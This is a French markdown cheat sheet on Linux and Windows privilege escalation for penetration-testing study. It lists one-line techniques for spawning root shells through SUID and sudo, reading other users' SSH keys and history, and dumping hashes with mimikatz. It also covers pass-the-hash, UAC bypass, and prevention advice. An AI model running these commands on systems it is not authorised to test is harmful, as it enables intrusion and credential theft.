# privilege-escalation.md

## cheat sheet - Élévation de privilèges (Verticale/Horizontale)

Ce document détaille les techniques d’élévation de privilèges verticale et horizontale sous Linux/Windows, à des fins éducatives et légales uniquement.

---

## 1. Comprendre l’élévation de privilèges

| **Type**             | **Description**                                      |
|----------------------|-----------------------------------------------------|
| **Verticale**        | Passage d’un niveau inférieur à supérieur (ex. : user → root/admin) |
| **Horizontale**      | Accès aux privilèges d’un autre utilisateur au même niveau |

---

## 2. Techniques Verticales (Linux)

### Commandes de détection
| **Commande**                 | **Description**                                      |
|------------------------------|-----------------------------------------------------|
| `whoami; id`                 | Vérifie l’utilisateur actuel                        |
| `sudo -l`                    | Liste les commandes sudo autorisées                 |
| `find / -perm -u=s 2>/dev/null` | Cherche les binaires SUID                        |
| `cat /etc/passwd`            | Liste les utilisateurs (cherche root/admin)         |
| `ls -la /etc/cron*`          | Vérifie les tâches cron éditables                   |

### Exploits
| **Technique**                | **Exemple**                        | **Description**                     |
|------------------------------|------------------------------------|-------------------------------------|
| SUID abuse                   | `find / -exec /bin/sh \;`          | Exécute un shell via SUID mal configuré |
| Sudo misconfig               | `sudo /bin/bash`                   | Exploite un sudo mal limité         |
| Kernel exploits              | `exploit-db: searchsploit linux kernel` | Utilise une faille kernel         |
| Cron jobs                    | Modifier script cron exécuté par root | Ajoute un shell ou commande       |
| Weak passwords               | `su root` (si mot de passe faible) | Bruteforce ou devinette            |

---

## 3. Techniques Horizontales (Linux)

| **Technique**                | **Exemple**                        | **Description**                     |
|------------------------------|------------------------------------|-------------------------------------|
| Fichiers lisibles            | `cat /home/user/.ssh/id_rsa`       | Vole une clé SSH privée             |
| Historique                   | `cat ~/.bash_history`              | Récupère des commandes sensibles    |
| Variables d’environnement    | `echo $PATH` (modifier PATH)       | Redirige vers un binaire malveillant |
| Processus utilisateur        | `ps aux | grep <user>`             | Identifie processus vulnérables     |
| Session ouverte              | `who; w`                           | Exploite une session active         |

---

## 4. Techniques Verticales (Windows)

### Commandes de détection
| **Commande**                 | **Description**                                      |
|------------------------------|-----------------------------------------------------|
| `whoami /all`                | Affiche les privilèges actuels                      |
| `net user`                   | Liste les utilisateurs                              |
| `systeminfo`                 | Infos système (utile pour exploits)                 |
| `dir /s /p "unattend.xml"`   | Cherche des fichiers de config avec creds          |
| `schtasks /query`            | Liste les tâches planifiées                         |

### Exploits
| **Technique**                | **Exemple**                        | **Description**                     |
|------------------------------|------------------------------------|-------------------------------------|
| Service misconfig            | `sc qc <service>` → `net start`    | Exploite un service mal configuré   |
| DLL Hijacking                | Remplace une DLL dans PATH         | Exécute code avec droits élevés     |
| Token Impersonation          | `Incognito` (Metasploit)           | Vole un jeton de privilège          |
| UAC Bypass                   | `msf: windows/local/bypassuac`     | Contourne le contrôle UAC           |
| Weak registry                | `reg query HKLM\SOFTWARE`          | Cherche des creds ou configs        |

---

## 5. Techniques Horizontales (Windows)

| **Technique**                | **Exemple**                        | **Description**                     |
|------------------------------|------------------------------------|-------------------------------------|
| SAM dump                     | `mimikatz: samdump`                | Récupère les hashes locaux          |
| Fichiers lisibles            | `type C:\Users\user\.rdp`          | Récupère des creds sauvegardés      |
| Processus utilisateur        | `tasklist /V`                      | Identifie processus vulnérables     |
| Session ouverte              | `qwinsta`                          | Exploite une session active         |
| Pass-the-Hash                | `pth-winexe -U <hash> <IP>`        | Accès avec hash NTLM                |

---

## 6. Préventions

| **Moyen**                    | **Explication**                                      |
|------------------------------|-----------------------------------------------------|
| Moindre privilège            | Limiter les droits au minimum nécessaire            |
| Mise à jour système          | Corriger les failles kernel/logicielles             |
| Supprimer SUID inutiles      | Réduire les binaires à risque                       |
| Permissions strictes         | Protéger fichiers sensibles (ex. : chmod 600)       |
| Désactiver comptes inutiles  | Réduire la surface d’attaque                        |
| Surveiller cron/tâches       | Vérifier les scripts exécutés                       |
| Chiffrer données sensibles   | Prévenir l’accès direct                             |
| Activer UAC (Windows)        | Forcer la validation des élévations                 |
| Journalisation               | Détecter les activités suspectes                    |
| Formation utilisateurs       | Éviter les mots de passe faibles                    |

---

## 7. Précautions

- **Usage légal** : Tests uniquement sur systèmes autorisés.
- **Outils** : Metasploit, Mimikatz, LinPEAS, WinPEAS pour automatisation.
- **Sauvegarde** : Tester dans un environnement isolé.
  
